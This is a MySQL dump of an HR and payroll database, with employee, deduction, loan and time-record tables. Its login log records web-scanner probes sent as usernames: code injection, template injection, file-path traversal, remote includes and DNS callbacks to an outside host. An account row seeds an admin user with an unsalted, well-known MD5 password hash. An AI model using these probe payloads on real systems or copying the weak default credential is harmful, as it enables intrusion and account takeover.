  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `userName` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `userPassword` varchar(50) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `userLevel` int(11) NOT NULL DEFAULT 5,
  `userPermission` varchar(20) NOT NULL DEFAULT 'Employee',
  `accessPermission` varchar(15) NOT NULL DEFAULT '1234',
  `assignedGroup` varchar(20) NOT NULL DEFAULT '',
  `signatory` text NOT NULL,
  `signatoryPosition` text NOT NULL,
  PRIMARY KEY (`empNumber`),
  KEY `Emp_No` (`empNumber`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblempaccount` (`empNumber`, `userName`, `userPassword`, `userLevel`, `userPermission`, `accessPermission`, `assignedGroup`, `signatory`, `signatoryPosition`) VALUES ('1111', 'hrmis', '21232f297a57a5a743894a0e4a801fc3', '1', 'HR Officer', '12345', '', '', '');


#
# TABLE STRUCTURE FOR: tblempaddincome
#

DROP TABLE IF EXISTS `tblempaddincome`;

CREATE TABLE `tblempaddincome` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `incomeCode` varchar(20) NOT NULL DEFAULT '',
  `incomeYear` year(4) NOT NULL DEFAULT 0000,
  `incomeMonth` int(11) NOT NULL DEFAULT 0,
  `incomeAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `incomeTaxAmount` decimal(10,2) NOT NULL DEFAULT 0.00
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempappointment
#

DROP TABLE IF EXISTS `tblempappointment`;

CREATE TABLE `tblempappointment` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `positionCode` varchar(20) NOT NULL DEFAULT '',
  `dateIssued` date NOT NULL DEFAULT '0000-00-00',
  `datePublished` date NOT NULL DEFAULT '0000-00-00',
  `placePublished` varchar(100) NOT NULL DEFAULT '',
  `relevantExperience` text NOT NULL,
  `relevantTraining` text NOT NULL,
  `appointmentissuedcode` int(11) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`appointmentissuedcode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempbenefits
#

DROP TABLE IF EXISTS `tblempbenefits`;

CREATE TABLE `tblempbenefits` (
  `benefitCode` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `incomeCode` varchar(20) NOT NULL DEFAULT '',
  `incomeMonth` int(11) NOT NULL DEFAULT 0,
  `incomeAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ITW` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period1` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period2` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period3` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period4` decimal(10,2) NOT NULL DEFAULT 0.00,
  `status` char(1) NOT NULL DEFAULT '',
  PRIMARY KEY (`benefitCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempchild
#

DROP TABLE IF EXISTS `tblempchild`;

CREATE TABLE `tblempchild` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `childCode` mediumint(9) NOT NULL AUTO_INCREMENT,
  `childName` varchar(80) NOT NULL DEFAULT '',
  `childBirthDate` date NOT NULL DEFAULT '0000-00-00',
  PRIMARY KEY (`childCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempdeductionremit
#

DROP TABLE IF EXISTS `tblempdeductionremit`;

CREATE TABLE `tblempdeductionremit` (
  `processID` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `code` int(11) NOT NULL DEFAULT 0,
  `deductionCode` varchar(20) NOT NULL DEFAULT '',
  `deductMonth` int(11) NOT NULL DEFAULT 0,
  `deductYear` year(4) NOT NULL DEFAULT 0000,
  `deductAmount` decimal(10,2) DEFAULT NULL,
  `period1` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period2` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period3` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period4` decimal(10,2) NOT NULL DEFAULT 0.00,
  `orNumber` varchar(20) DEFAULT NULL,
  `orDate` date DEFAULT NULL,
  `TYPE` varchar(20) NOT NULL DEFAULT '',
  `appointmentCode` varchar(20) NOT NULL DEFAULT '',
  `employerAmount` decimal(10,2) NOT NULL DEFAULT 0.00
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempdeductions
#

DROP TABLE IF EXISTS `tblempdeductions`;

CREATE TABLE `tblempdeductions` (
  `deductCode` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) DEFAULT NULL,
  `deductionCode` varchar(20) NOT NULL DEFAULT '',
  `amountGranted` decimal(10,2) NOT NULL DEFAULT 0.00,
  `dateGranted` date NOT NULL DEFAULT '0000-00-00',
  `actualStartYear` year(4) NOT NULL DEFAULT 0000,
  `actualStartMonth` int(11) NOT NULL DEFAULT 0,
  `actualEndYear` year(4) NOT NULL DEFAULT 0000,
  `actualEndMonth` int(11) NOT NULL DEFAULT 0,
  `annual` decimal(10,2) NOT NULL DEFAULT 0.00,
  `monthly` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period1` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period2` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period3` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period4` decimal(10,2) NOT NULL DEFAULT 0.00,
  `status` char(1) NOT NULL DEFAULT '',
  PRIMARY KEY (`deductCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempdeductloan
#

DROP TABLE IF EXISTS `tblempdeductloan`;

CREATE TABLE `tblempdeductloan` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `deductionCode` varchar(20) NOT NULL DEFAULT '',
  `loanCode` int(11) NOT NULL AUTO_INCREMENT,
  `amountGranted` decimal(10,2) NOT NULL DEFAULT 0.00,
  `dateGranted` date DEFAULT NULL,
  `deductAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `actualStartYear` year(4) NOT NULL DEFAULT 0000,
  `actualStartMonth` int(11) NOT NULL DEFAULT 0,
  `actualEndYear` year(4) NOT NULL DEFAULT 0000,
  `actualEndMonth` int(11) NOT NULL DEFAULT 0,
  `status` char(1) NOT NULL DEFAULT '',
  PRIMARY KEY (`loanCode`)
) ENGINE=MyISAM AUTO_INCREMENT=146 DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempdeductloanconadjust
#

DROP TABLE IF EXISTS `tblempdeductloanconadjust`;

CREATE TABLE `tblempdeductloanconadjust` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `code` int(11) NOT NULL DEFAULT 0,
  `deductionCode` varchar(20) NOT NULL DEFAULT '',
  `deductMonth` varchar(10) NOT NULL DEFAULT '',
  `deductYear` year(4) NOT NULL DEFAULT 0000,
  `deductAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `type` varchar(20) NOT NULL DEFAULT '',
  `adjustSwitch` char(1) NOT NULL DEFAULT '',
  `adjustMonth` varchar(10) NOT NULL DEFAULT '0',
  `adjustYear` year(4) NOT NULL DEFAULT 0000,
  `adjustPeriod` int(11) NOT NULL DEFAULT 0,
  `xappointmentCode` varchar(20) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempdtr
#

DROP TABLE IF EXISTS `tblempdtr`;

CREATE TABLE `tblempdtr` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(50) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `biometricsNumber` int(11) NOT NULL,
  `dtrDate` date DEFAULT NULL,
  `inAM` time NOT NULL DEFAULT '00:00:00',
  `outAM` time NOT NULL DEFAULT '00:00:00',
  `inPM` time NOT NULL DEFAULT '00:00:00',
  `outPM` time NOT NULL DEFAULT '00:00:00',
  `inOT` time NOT NULL DEFAULT '00:00:00',
  `outOT` time NOT NULL DEFAULT '00:00:00',
  `DTRreason` varchar(100) NOT NULL,
  `remarks` varchar(255) NOT NULL DEFAULT '',
  `otherInfo` varchar(255) NOT NULL DEFAULT '',
  `OT` int(11) NOT NULL DEFAULT 0,
  `name` text NOT NULL,
  `ip` text NOT NULL,
  `editdate` text NOT NULL,
  `perdiem` char(1) NOT NULL DEFAULT '',
  `oldValue` text DEFAULT NULL,
  `wfh` tinyint(4) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_dtrDate` (`dtrDate`),
  KEY `idx_empNumber` (`empNumber`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempdtr_log
#

DROP TABLE IF EXISTS `tblempdtr_log`;

CREATE TABLE `tblempdtr_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) NOT NULL,
  `log_date` datetime NOT NULL,
  `log_sql` text NOT NULL,
  `log_notify` varchar(150) NOT NULL,
  `log_ip` varchar(35) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1553 DEFAULT CHARSET=latin1;

INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1', '', '2023-03-10 17:06:50', '', 'Invalid username/password. Tried with: kgsee', '110.54.150.22');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('2', '', '2023-05-08 03:33:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('3', '', '2023-05-08 03:36:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('4', '', '2023-05-08 03:38:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('5', '', '2023-05-08 03:39:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('6', '', '2023-05-08 03:40:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('7', '', '2023-05-08 03:40:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('8', '', '2023-05-08 03:40:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('9', '', '2023-05-08 03:40:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('10', '', '2023-05-08 03:40:33', '', 'Invalid username/password. Tried with: response.write(9618342*9686388)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('11', '', '2023-05-08 03:40:34', '', 'Invalid username/password. Tried with: \'+response.write(9618342*9686388)+\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('12', '', '2023-05-08 03:40:34', '', 'Invalid username/password. Tried with: \"+response.write(9618342*9686388)+\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('13', '', '2023-05-08 03:40:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('14', '', '2023-05-08 03:40:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('15', '', '2023-05-08 03:40:35', '', 'Invalid username/password. Tried with: ${9999524+9999615}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('16', '', '2023-05-08 03:40:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('17', '', '2023-05-08 03:40:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('18', '', '2023-05-08 03:40:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('19', '', '2023-05-08 03:40:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('20', '', '2023-05-08 03:40:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('21', '', '2023-05-08 03:40:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('22', '', '2023-05-08 03:40:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('23', '', '2023-05-08 03:40:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('24', '', '2023-05-08 03:40:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('25', '', '2023-05-08 03:40:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('26', '', '2023-05-08 03:40:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('27', '', '2023-05-08 03:40:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('28', '', '2023-05-08 03:40:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('29', '', '2023-05-08 03:40:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('30', '', '2023-05-08 03:40:37', '', 'Invalid username/password. Tried with: http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('31', '', '2023-05-08 03:40:37', '', 'Invalid username/password. Tried with: 1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('32', '', '2023-05-08 03:40:38', '', 'Invalid username/password. Tried with: Http://bxss.me/t/fit.txt', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('33', '', '2023-05-08 03:40:38', '', 'Invalid username/password. Tried with: http://bxss.me/t/fit.txt?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('34', '', '2023-05-08 03:40:38', '', 'Invalid username/password. Tried with: /etc/shells', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('35', '', '2023-05-08 03:40:38', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('36', '', '2023-05-08 03:40:38', '', 'Invalid username/password. Tried with: c:/windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('37', '', '2023-05-08 03:40:39', '', 'Invalid username/password. Tried with: bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('38', '', '2023-05-08 03:40:39', '', 'Invalid username/password. Tried with: MU9nbTlpaWY=', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('39', '', '2023-05-08 03:40:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('40', '', '2023-05-08 03:40:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('41', '', '2023-05-08 03:40:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('42', '', '2023-05-08 03:40:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('43', '', '2023-05-08 03:40:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('44', '', '2023-05-08 03:40:40', '', 'Invalid username/password. Tried with: )', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('45', '', '2023-05-08 03:40:41', '', 'Invalid username/password. Tried with: !(()&&!|*|*|', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('46', '', '2023-05-08 03:40:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('47', '', '2023-05-08 03:40:41', '', 'Invalid username/password. Tried with: ^(#$!@#$)(()))******', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('48', '', '2023-05-08 03:40:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('49', '', '2023-05-08 03:40:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('50', '', '2023-05-08 03:40:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('51', '', '2023-05-08 03:40:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('52', '', '2023-05-08 03:40:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('53', '', '2023-05-08 03:40:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('54', '', '2023-05-08 03:40:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('55', '', '2023-05-08 03:40:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('56', '', '2023-05-08 03:40:42', '', 'Invalid username/password. Tried with: \'.gethostbyname(lc(\'hitaf\'.\'slluwqqx947a1.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(122).chr(90).chr(107).chr(', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('57', '', '2023-05-08 03:40:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('58', '', '2023-05-08 03:40:43', '', 'Invalid username/password. Tried with: \".gethostbyname(lc(\"hitxp\".\"rdymfuvu1edd7.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(112).chr(85).chr(121).chr(', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('59', '', '2023-05-08 03:40:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('60', '', '2023-05-08 03:40:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('61', '', '2023-05-08 03:40:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('62', '', '2023-05-08 03:40:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('63', '', '2023-05-08 03:40:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('64', '', '2023-05-08 03:40:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('65', '', '2023-05-08 03:40:44', '', 'Invalid username/password. Tried with: ;assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('66', '', '2023-05-08 03:40:44', '', 'Invalid username/password. Tried with: RDFYjolf<esi:include src=\"http://bxss.me/rpb.png\"/>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('67', '', '2023-05-08 03:40:44', '', 'Invalid username/password. Tried with: \';print(md5(31337));$a=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('68', '', '2023-05-08 03:40:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('69', '', '2023-05-08 03:40:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('70', '', '2023-05-08 03:40:44', '', 'Invalid username/password. Tried with: \";print(md5(31337));$a=\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('71', '', '2023-05-08 03:40:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('72', '', '2023-05-08 03:40:44', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('73', '', '2023-05-08 03:40:45', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('74', '', '2023-05-08 03:40:45', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}\\', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('75', '', '2023-05-08 03:40:45', '', 'Invalid username/password. Tried with: HttP://bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('76', '', '2023-05-08 03:40:45', '', 'Invalid username/password. Tried with: \'.print(md5(31337)).\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('77', '', '2023-05-08 03:40:45', '', 'Invalid username/password. Tried with: bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('78', '', '2023-05-08 03:40:45', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('79', '', '2023-05-08 03:40:45', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('80', '', '2023-05-08 03:40:45', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('81', '', '2023-05-08 03:40:45', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('82', '', '2023-05-08 03:40:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('83', '', '2023-05-08 03:40:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
